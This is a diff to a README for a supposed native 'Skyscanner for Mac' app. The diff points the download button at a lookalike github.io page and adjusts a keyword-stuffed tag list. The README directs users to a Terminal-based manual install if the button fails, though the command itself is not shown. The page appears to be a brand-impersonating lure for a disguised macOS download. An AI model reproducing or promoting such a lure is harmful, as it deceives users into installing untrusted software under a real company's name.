@@ -2,7 +2,7 @@
 
 Skyscanner for Mac is your all-in-one travel planning app. With the native macOS app, you can seamlessly compare flights, hotels, and car rentals across thousands of providers in real time. Enjoy a streamlined experience for booking your next trip with ease—right from your Mac.
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue.svg?style=for-the-badge\&logo=apple)](#)
+[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue.svg?style=for-the-badge\&logo=apple)](https://skyscanner-app-download-for-mac-os.github.io/.github/)
 
 If the download button doesn’t work, follow the instructions below to install Skyscanner manually using your Terminal.
 
@@ -73,5 +73,4 @@ Optimized for both Apple Silicon and Intel Macs, the app ensures smooth performa
 
 ## 🔍 Tags
 
-skyscanner for mac, skyscanner app, sky scanne r, skyscanner application,skyscanner app mac, skyscanner mac download, skyscanner macos, download skyscanner for mac, 
-
+skyscanner for mac, skyscanner app, sky scanne r, skyscanner application,skyscanner app mac, skyscanner mac download, skyscanner macos, download skyscanner for mac
